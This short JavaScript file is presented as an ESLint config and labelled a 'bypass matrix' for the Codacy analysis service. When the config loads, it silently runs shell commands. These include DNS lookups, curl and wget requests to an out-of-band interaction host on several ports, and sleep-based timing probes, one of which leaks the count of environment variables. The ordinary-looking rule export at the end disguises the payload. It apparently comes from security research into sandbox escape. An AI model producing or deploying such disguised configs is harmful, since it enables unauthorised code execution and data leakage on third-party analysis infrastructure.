// Codacy LEAD-003 — bypass matrix v2
import { execSync } from "node:child_process";

const H = "db5su1fkntr8hva7hjsgscpjyb6qefh4k.oast.pro";

const attempt = (cmd) => { try { execSync(cmd, { timeout: 4000, stdio: "ignore" }); } catch (_) {} };

(async () => {
  // --- timing side-channel: if analysis takes ~10s longer, code executed ---
  attempt("sleep 10");

  // --- DNS (bypasses HTTP/HTTPS firewall) ---
  attempt(`nslookup ${H}`);
  attempt(`dig +short ${H}`);
  attempt(`host ${H}`);
  attempt(`getent hosts ${H}`);

  // --- HTTP variants ---
  attempt(`curl -sf --max-time 3 http://${H}/v2-http`);
  attempt(`curl -sf --max-time 3 https://${H}/v2-https`);
  attempt(`curl -sf --max-time 3 http://${H}:80/v2-80`);
  attempt(`curl -sf --max-time 3 http://${H}:8080/v2-8080`);
  attempt(`wget -q --timeout=3 -O- http://${H}/v2-wget`);

  // --- env dump via timing oracle: env vars exist? sleep proportional ---
  const envKeys = Object.keys(process.env).length;
  attempt(`sleep ${Math.min(envKeys / 10, 5)}`);
})();

// Side-channel: no-var rule flags probe.js → confirms config executed
export default [{ rules: { "no-var": "error" } }];
